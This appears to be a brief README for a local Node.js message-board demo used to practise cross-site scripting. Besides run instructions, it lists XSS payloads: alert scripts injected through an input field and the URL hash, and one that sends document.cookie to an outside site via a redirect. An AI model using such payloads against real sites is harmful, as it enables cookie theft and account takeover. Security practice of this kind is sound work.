# mesage_board
node app.js
http://localhost:3000/
xss
1:input输入<script type="text/javascript">alert('xss')</script>
2:链接hash  http://localhost:3000/#<script>alert(1)</script>
 
http://localhost:3000/#<script>location.href="http://www.baidu.com/?"+document.cookie</script>